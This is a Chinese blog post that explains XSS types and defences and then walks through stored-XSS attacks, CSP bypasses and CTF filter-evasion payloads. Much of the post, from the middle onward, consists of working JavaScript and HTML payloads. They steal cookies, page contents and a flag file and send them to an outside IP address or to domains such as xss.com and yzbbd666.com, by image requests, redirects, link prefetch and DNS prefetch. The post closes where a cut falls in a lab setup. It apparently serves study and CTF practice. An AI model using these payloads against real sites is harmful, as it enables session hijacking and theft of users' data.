<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-08-07T01:16:40.250Z">2023-08-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2023-12-21T08:47:31.132Z">2023-12-21</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>浅析XSS漏洞</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="xss注入总结">XSS注入总结</h1>
<h3 id="一-xss漏洞原理">一、XSS漏洞原理</h3>
<p>XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。</p>
<p>当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。</p>
<h3 id="二-xss漏洞的危害">二、XSS漏洞的危害</h3>
<p>（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>
（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>
（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>
（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
<h3 id="三-xss漏洞的分类">三、XSS漏洞的分类</h3>
<h4 id="1-反射型xss">1、反射型XSS</h4>
<p><strong>反射型XSS，也称为非持久性XSS，是最常见的一种XSS。</strong></p>
<p>XSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。</p>
<p>该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。</p>
<h4 id="2-存储型xss">2、存储型XSS</h4>
<p><strong>存储型XSS，也称为持久性XSS。</strong></p>
<p>在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。</p>
<p>存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。</p>
<p>这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。</p>
<h4 id="3-dom型xss">3、DOM型XSS</h4>
<p><strong>DOM (Document Objet Model)指文档对象模型。</strong></p>
<p>DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。</p>
<p>该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。</p>
<p>因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。</p>
<h4 id="4-判断是哪一种xss">4、判断是哪一种XSS</h4>
<p>发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。</p>
<h3 id="四-xss漏洞的检测与防御">四、XSS漏洞的检测与防御</h3>
<h4 id="1-检测">1、检测</h4>
<p><strong>手工检测</strong></p>
<p>手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。</p>
<p>在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。</p>
<p>手工检测结果相对准确，但效率较低。<br>
<strong>工具检测</strong></p>
<p>常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。</p>
<h4 id="2-防御">2、防御</h4>
<pre><code class="hljs plaintext">●使用黑名单进行

●对HTML标签或特殊字符进行过滤

●使用内容安全的CSP

●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。

●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码'、十六进制编码'、HTML编码&amp;apos、Unicode编码\u0027等）。

●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为"、单引号转化为&amp;apos、与转化 为&amp;等。

●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。</code></pre>
<pre><code class="hljs plaintext">&lt;?php
    Header("Set-Cookie:password=123456;httponly",false);
&gt;</code></pre>
<p><strong>关键点：</strong><br>
目标网站的目标用户</p>
<ul>
<li>浏览器</li>
<li>不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时<strong>被浏览器解析执行</strong></li>
<li>“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。</li>
</ul>
<p><strong>总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行</strong></p>
<h1 id="1基于存储型的xss攻击">1.基于存储型的XSS攻击</h1>
<p><strong>上面说了这么多还是不知道xss攻击应该运用在哪些场景下，下面我们把XSS分为有CSP保护和无CSP保护两个场景来实现。</strong></p>
<h2 id="0x01-无csp保护下的xss">0x01 无CSP保护下的XSS</h2>
<h3 id="1直接嵌入型">1.直接嵌入型</h3>
<p>当过滤的东西较少时，可以优先考虑这个。这种xss触发方式比较直接，直接嵌入能够xss的js代码，下面看一个例子。</p>
<pre><code class="hljs html">//admin访问页面
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();</span>
<span class="language-javascript">img.<span class="hljs-property">src</span> = <span class="hljs-string">'http://45.78.29.252:8888/?a='</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span>
<span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"head"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(img);  </span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328211110610.png" alt="image-20230328211110610"></p>
<p>js代码与图片嵌入head中一起解析，之后将获取的cookie发送至xss平台</p>
<h3 id="2import导入型">2.import导入型</h3>
<p>经常用于过滤比较严格的情况，经过实验发现link的属性rel值为import时会将资源请求回来并一同解析，注意必须是完整的资源例如HTML、PHP、JS等。请求的资源必须要设置为允许跨域加载的响应头。</p>
<pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 无csp 远程包含js文件 --&gt;</span>admin访问页面
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>无csp/远程包含js文件/import<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">import</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://yzbbd666.com/2.php</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>下面是<a target="_blank" rel="noopener" href="http://yzbbd666.com/2.php%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B3%A8%E6%84%8F%E5%A1%AB%E5%86%99Access-Control-Allow-Origin">http://yzbbd666.com/2.php文件内容注意填写Access-Control-Allow-Origin</a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Access-Control-Allow-Origin: *"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;
<span class="hljs-meta">?&gt;</span>
&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"</span>&gt;&lt;/script&gt;
&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
$.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">"http://127.0.0.1/flag.php"</span>,function(data){
<span class="hljs-comment">//alert(data);</span>
        location.href=<span class="hljs-string">"http://45.78.29.252:8888/?a="</span>+<span class="hljs-title function_ invoke__">escape</span>(data);
});
&lt;/script&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328211120983.png" alt="image-20230328211120983"></p>
<p>我们发现访问成功了，link的import会首先将访问的资源执行所以会触发xss漏洞，将盗取的才cookie值发送至服务器</p>
<h3 id="3script导入型">3.script导入型</h3>
<p>一般也是输入限制比较多的时候，请求访问可以利用script的远程js加载。</p>
<pre><code class="hljs html">//admin访问页面
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://yzbbd666.com/ld.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><a target="_blank" rel="noopener" href="http://yzbbd666.com/ld.js%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E6%98%AFjs%E6%A0%BC%E5%BC%8F">http://yzbbd666.com/ld.js内容如下，注意这里是js格式</a></p>
<pre><code class="hljs js">
<span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
img.<span class="hljs-property">src</span> = <span class="hljs-string">'http://45.78.29.252:8888/?a='</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"head"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(img);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328211358253.png" alt="image-20230328211358253"></p>
<p>说明script加载并执行了远程js脚本，并将cookie发送至xss平台</p>
<h2 id="0x02-有csp保护下的xss">0x02 有CSP保护下的XSS</h2>
<blockquote>
<p>CSP中文意思是内容安全策略，为了保护文档内容而实施的策略，首先简答介绍一下CSP相关内容，其次讲解一下绕过方法。</p>
</blockquote>
<h3 id="1内容安全策略">1.内容安全策略</h3>
<h4 id="1-csp策略">（1） CSP策略</h4>
<pre><code>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：
Content-Security-Policy: default-src ‘self’ www.baidu.com; script-src ‘unsafe-inline’
其中每一组策略包含一个策略指令和一个内容源列表
</code></pre>
<h4 id="2-常用的策略指令">（2） 常用的策略指令</h4>
<pre><code>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：
child-src指定定义了 web workers 以及嵌套的浏览上下文
connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。
font-src定义了字体加载的有效来源
img-src定义了页面中图片和图标的有效来源
media-src针对媒体引入的 HTML 多媒体的加载策略。
object-src插件(比如 Flash)，针对 、 或 等标签引入的 flash 等插件的加载策略。
style-src定义了页面中CSS样式的有效来源
script-src 定义了页面中Javascript的有效来源（外部脚本）
</code></pre>
<h5 id="内容源">内容源</h5>
<p>内容源有三种：源列表、关键字和数据</p>
<pre><code>源列表
源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘‘)，端口号也可以使用通配符 (同样是 ‘‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。
有效的主机表达式包括：
http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）
mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）
https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）
如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。

关键字
‘none’
代表空集；即不匹配任何 URL。两侧单引号是必须的。
‘self’
代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。
‘unsafe-inline’
允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。
‘unsafe-eval’
允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。
Content-Security-Policy: default-src 'self' trustedscripts.foo.com

数据
data:
允许data: URI作为内容来源。
mediastream:
允许mediastream: URI作为内容来源。
Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:
</code></pre>
<h3 id="2跳转">2.跳转</h3>
<h4 id="meta标签跳转">meta标签跳转</h4>
<blockquote>
<p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
</blockquote>
<pre><code class="hljs php"><span class="hljs-comment">//admin访问页面</span>
<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Security-Policy: default-src 'none';"</span>) ;<span class="hljs-comment">//这里可以设置CSP</span>
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;XSS&lt;/title&gt;
    &lt;meta http-equiv=<span class="hljs-string">"refresh"</span> content=<span class="hljs-string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328212119810.png" alt="image-20230328212119810"></p>
<p>发现图片不能被访问，但meta标签中的内容可以被访问，成功弹至xss平台。</p>
<pre><code class="hljs plaintext">小tip：如何获取cookie
(1)通过document.cookie获取所有的cookie值，获取到一个cookie所有值在一起的字符串。

(2)因为所有的cookie都是以分号隔开的，所有使用split(‘;’)将这个字符串切开变成数组，存起来。

(3)判断数组中每一项有没有包含cookie名字的，如果有，把对应的值取出来就行。</code></pre>
<h4 id="script脚本跳转">script脚本跳转</h4>
<blockquote>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
</blockquote>
<pre><code class="hljs js">&lt;script&gt;
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"http://www.xss.com/x.php?c=[cookie]"</span>;
&lt;/script&gt;


<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span>
<span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">"flag.php"</span>;</span></span>
<span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 id="prefetch预加载绕过">prefetch预加载绕过</h4>
<pre><code>CSP对link标签的预加载功能考虑不完善。
在Chrome下，可以使用如下标签发送cookie
&lt;link rel="prefetch" href="http://www.xss.com/x.php?c=[cookie]"&gt;
在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie
&lt;link rel="dns-prefetch" href="//[cookie].xxx.ceye.io"&gt;
</code></pre>
<p>实验代码<br>
admin访问界面<br>
注意这里允许里内联脚本，所以理所当然的可以使用跳转的方法获取cookie的值。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-inline';"</span>) ;<span class="hljs-comment">//这里可以设置CSP</span>
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;XSS&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;script&gt;
<span class="hljs-keyword">var</span> n0t = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">"link"</span>);
    n0t.<span class="hljs-title function_ invoke__">setAttribute</span>(<span class="hljs-string">"rel"</span>, <span class="hljs-string">"prefetch"</span>);
    n0t.<span class="hljs-title function_ invoke__">setAttribute</span>(<span class="hljs-string">"href"</span>, <span class="hljs-string">"http://45.78.29.252:8888/?a="</span> + <span class="hljs-title function_ invoke__">String</span>(document.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">"html"</span>)[<span class="hljs-number">0</span>].innerHTML).<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>));
    document.head.<span class="hljs-title function_ invoke__">appendChild</span>(n0t);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328212941614.png" alt="image-20230328212941614"></p>
<p>成功获取cookie值</p>
<h2 id="0x03-xss绕过技巧">0x03 XSS绕过技巧</h2>
<p><strong>检索到了一个高级xss绕过备忘录（晦涩难懂）等日后拜读吧</strong></p>
<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS 过滤器规避 - OWASP 备忘单系列</a></p>
<h2 id="0x04-实例解析">0x04 实例解析</h2>
<p>这一部分呢将作为长期更新的地方如果遇到好的xss题目可以联系我，将一些不错的xss题目总结在这里，为的是把理论知识与实践相结合</p>
<h3 id="0x1-htcf-guestbook">0x1 htcf guestbook</h3>
<p>从代码中我们可以看到基本的过滤</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>
<span class="hljs-function"></span>{
<span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'\''</span>,<span class="hljs-string">'\\\\'</span>);
<span class="hljs-variable">$escape</span> = <span class="hljs-string">'/'</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">'/'</span>;
<span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">'_'</span>, <span class="hljs-variable">$string</span>);
<span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'select'</span>, <span class="hljs-string">'insert'</span>, <span class="hljs-string">'update'</span>, <span class="hljs-string">'delete'</span>, <span class="hljs-string">'where'</span>);
<span class="hljs-variable">$safe</span> = <span class="hljs-string">'/'</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">'/i'</span>;
<span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">'hacker'</span>, <span class="hljs-variable">$string</span>);
<span class="hljs-variable">$xsssafe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'img'</span>,<span class="hljs-string">'script'</span>,<span class="hljs-string">'on'</span>,<span class="hljs-string">'svg'</span>,<span class="hljs-string">'link'</span>);
<span class="hljs-variable">$xsssafe</span> = <span class="hljs-string">'/'</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$xsssafe</span>) . <span class="hljs-string">'/i'</span>;
<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$xsssafe</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$string</span>);
}</code></pre>
<p>函数解析：</p>
<p>1、explode()函数 把字符串打散为数组：</p>
<p>2、implode()函数 把数组元素组合为字符串：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-variable">$str</span> = <span class="hljs-string">'107_lab_2017'</span>;
	<span class="hljs-variable">$array</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'_'</span>, <span class="hljs-variable">$str</span>);<span class="hljs-comment">//以下划线为分隔符将字符串打散为数组 </span>
	<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$array</span>);
	
	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">'_'</span>, <span class="hljs-variable">$array</span>);<span class="hljs-comment">//以下划线为分隔符将数组合并成字符串</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230328213914905.png" alt="image-20230328213914905"></p>
<p>我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于</p>
<p>scrscriptipt这样。</p>
<p><strong>所以其实关键在于CSP</strong></p>
<p><code>Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</code><br>
这里上述都已经提到绕过方法主要有两种，一种直接利用跳转，第二种利用预加载</p>
<p>不熟悉的人可能并不清楚其中的CSP有什么样的问题，事实，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。</p>
<h4 id="1跳转绕过">1.跳转绕过：</h4>
<pre><code class="hljs js">&lt;scrscriptipt&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">" http://xxxx:8080/cookie.asp?msg= "</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>)&lt;/scrscr iptipt&gt;

&lt;scrscriptipt&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-property">locatioonn</span>.<span class="hljs-property">href</span>%3d<span class="hljs-string">"http%3a// www.example.com/xss/write.php%3fdomain%3d "</span>%2bescape(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)%3b&lt;/sscriptcript&gt;

&lt;scrscriptipt&gt;<span class="hljs-keyword">var</span> a=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);a.<span class="hljs-property">href</span>=<span class="hljs-string">' http://xss.com/?cookie= '</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);a.<span class="hljs-title function_">click</span>();&lt;/sscriptcript&gt;</code></pre>
<p>上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。</p>
<h4 id="2chrome对csp支持的不完整绕过-预加载绕过">2.chrome对CSP支持的不完整绕过 预加载绕过</h4>
<p>从文章中可以获得对漏洞的整体了解，主要是2篇</p>
<p><a target="_blank" rel="noopener" href="http://paper.seebug.org/91/">第一篇</a></p>
<p><a target="_blank" rel="noopener" href="http://lorexxar.cn/2016/10/28/csp-then/">lorexxar大佬的</a></p>
<p>后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload</p>
<pre><code class="hljs js">&lt;<span class="hljs-title class_">Scscriptript</span>&gt;<span class="hljs-keyword">var</span> n0t = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"liscriptnk"</span>);n0t.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"rel"</span>, <span class="hljs-string">"prefetch"</span>);n0t.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"href"</span>, <span class="hljs-string">"//xxx:2333/"</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(n0t);&lt;/<span class="hljs-title class_">Scscriptript</span>&gt;</code></pre>
<p>后面xss平台或者vps接受一发搞定</p>
<h2 id="0x05-0ctf-simplexss">0x05 0ctf simplexss</h2>
<p>复现一下xss环境。<br>
实验环境:<br>
192.168.43.182 （本地主机）<br>
192.168.43.165 （flag所在地）</p>
<p><strong>192.168.43.165</strong></p>
<p>1.php<br>
